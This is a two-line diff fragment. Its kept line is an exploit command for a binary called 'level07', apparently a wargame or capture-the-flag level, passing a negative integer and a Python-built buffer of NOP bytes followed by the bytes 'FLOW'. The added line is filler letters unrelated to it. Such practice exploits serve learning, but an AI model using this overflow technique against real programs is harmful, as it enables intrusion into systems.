@@ -1,1 +1,2 @@
 ./level07 -1073741808 $(python -c 'print "\x90"*60 + "\x46\x4c\x4f\x57"')
+abc def ghi jkl mno pqr stu
